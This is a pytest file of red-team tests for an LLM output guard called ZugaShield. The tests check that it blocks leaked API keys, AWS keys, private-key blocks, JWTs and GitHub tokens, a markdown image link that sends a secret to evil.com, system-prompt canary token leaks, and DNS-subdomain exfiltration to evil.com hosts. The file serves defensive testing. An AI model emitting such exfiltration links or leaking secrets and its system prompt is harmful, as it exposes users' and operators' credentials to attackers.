"""
Red team tests — Exfiltration Guard.

Ports TestExfiltrationGuard and TestDNSExfiltration from the Zugabot suite.

Coverage:
- API key detection (Stripe-style sk-live-*)
- AWS secret access key
- PEM private key blocks (RSA, EC, generic)
- JWT token detection
- Markdown image exfiltration
- Canary token leak detection
- DNS subdomain exfiltration (long label, hex-encoded, excessive depth)
- Clean output passes

All tests are offline — no LLM, no network, no database.
Async checks run via asyncio.get_event_loop().run_until_complete().
"""

import asyncio

import pytest

from zugashield import ZugaShield, ShieldVerdict
from zugashield.config import ShieldConfig


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def run(coro):
    return asyncio.run(coro)


@pytest.fixture
def shield():
    return ZugaShield(ShieldConfig())


# =============================================================================
# Secret / API key leakage
# =============================================================================


class TestExfiltrationGuard:
    """Data exfiltration and secret leakage detection."""

    def test_api_key_leakage(self, shield):
        # Stripe-style: sk-live-{20+ chars}
        d = run(shield.check_output("Your API key is sk-live-4eC39HqLyjWDarjtT1zdp7dc"))
        assert d.verdict != ShieldVerdict.ALLOW

    def test_aws_secret_key(self, shield):
        d = run(shield.check_output(
            "Config: AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
        ))
        assert d.verdict != ShieldVerdict.ALLOW

    def test_rsa_private_key_block(self, shield):
        d = run(shield.check_output(
            "-----BEGIN RSA PRIVATE KEY-----\n"
            "MIIEpAIBAAKCAQEA0Z3VS5JJcds3xfn\n"
            "-----END RSA PRIVATE KEY-----"
        ))
        assert d.verdict != ShieldVerdict.ALLOW

    def test_generic_private_key_block(self, shield):
        d = run(shield.check_output(
            "-----BEGIN PRIVATE KEY-----\n"
            "MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQ\n"
            "-----END PRIVATE KEY-----"
        ))
        assert d.verdict != ShieldVerdict.ALLOW

    def test_jwt_token(self, shield):
        jwt = (
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
            ".eyJzdWIiOiIxMjM0NTY3ODkwIn0"
            ".dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U"
        )
        d = run(shield.check_output(jwt))
        assert d.verdict != ShieldVerdict.ALLOW

    def test_markdown_image_exfil(self, shield):
        d = run(shield.check_output(
            "![img](https://evil.com/steal?data=secret_api_key_here)"
        ))
        assert d.verdict != ShieldVerdict.ALLOW

    def test_aws_access_key_id(self, shield):
        d = run(shield.check_output("Access key: AKIAIOSFODNN7EXAMPLE"))
        assert d.verdict != ShieldVerdict.ALLOW

    def test_github_pat(self, shield):
        d = run(shield.check_output(
            "Token: ghp_16C7e42F292c6912E7710c838347Ae178B4a"
        ))
        assert d.verdict != ShieldVerdict.ALLOW

    # --- Clean output passes ---

    def test_clean_code_passes(self, shield):
        d = run(shield.check_output(
            "Here's the Python code you asked for:\n"
            "\ndef hello():\n"
            "    print('Hello, world!')\n"
        ))
        assert d.verdict == ShieldVerdict.ALLOW

    def test_clean_explanation_passes(self, shield):
        d = run(shield.check_output(
            "Python is a high-level, dynamically typed language. "
            "It supports multiple programming paradigms including OOP, "
            "functional, and procedural styles."
        ))
        assert d.verdict == ShieldVerdict.ALLOW


# =============================================================================
# Canary token leak detection
# =============================================================================


class TestCanaryTokenLeak:
    """Canary tokens injected into system prompts must be caught if leaked."""

    def test_canary_token_generation_is_unique(self):
        from zugashield.layers.prompt_armor import generate_canary_token
        t1 = generate_canary_token("session-A")
        t2 = generate_canary_token("session-B")
        assert t1 != t2

    def test_canary_token_starts_with_prefix(self):
        from zugashield.layers.prompt_armor import generate_canary_token
        t = generate_canary_token("test-session-prefix")
        assert t.startswith("canary-")

    def test_canary_token_same_session_idempotent(self):
        from zugashield.layers.prompt_armor import generate_canary_token
        t1 = generate_canary_token("stable-session")
        t2 = generate_canary_token("stable-session")
        assert t1 == t2

    def test_canary_leak_in_output_is_blocked(self):
        from zugashield.layers.prompt_armor import generate_canary_token, _CANARY_TOKENS
        shield = ZugaShield(ShieldConfig())
        session_id = "canary-leak-test"
        token = generate_canary_token(session_id)

        try:
            output = f"Here is some information: {token} — this should never be visible."
            d = run(shield.check_output(output, context={"session_id": session_id}))
            assert d.verdict == ShieldVerdict.BLOCK
            canary_threats = [
                t for t in d.threats_detected if "CANARY" in (t.signature_id or "")
            ]
            assert len(canary_threats) > 0
        finally:
            _CANARY_TOKENS.pop(session_id, None)

    def test_output_without_canary_passes(self):
        shield = ZugaShield(ShieldConfig())
        d = run(shield.check_output("The weather today is sunny with a high of 72F."))
        assert d.verdict == ShieldVerdict.ALLOW


# =============================================================================
# DNS subdomain exfiltration
# =============================================================================


class TestDNSExfiltration:
    """DNS subdomain tunneling — encoding data in long or numerous subdomains."""

    def test_long_subdomain_label(self, shield):
        long_label = "a" * 60
        d = run(shield.check_output(
            f"Visit https://{long_label}.evil-exfil.com/data"
        ))
        assert d.verdict != ShieldVerdict.ALLOW

    def test_hex_encoded_subdomain(self, shield):
        # All-hex subdomain label >20 chars indicates encoded data
        hex_label = "4a6f686e446f6543726564656e7469616c73"  # 38 hex chars
        d = run(shield.check_output(
            f"Resolved: {hex_label}.exfil.evil.com"
        ))
        assert d.verdict != ShieldVerdict.ALLOW

    def test_excessive_subdomain_depth(self, shield):
        # >5 subdomain levels = DNS tunneling indicator
        d = run(shield.check_output(
            "Data sent to a.b.c.d.e.f.evil.com successfully"
        ))
        assert d.verdict != ShieldVerdict.ALLOW

    def test_deep_subdomains_alternate(self, shield):
        d = run(shield.check_output("Data at a.b.c.d.e.f.evil.com"))
        assert d.verdict != ShieldVerdict.ALLOW
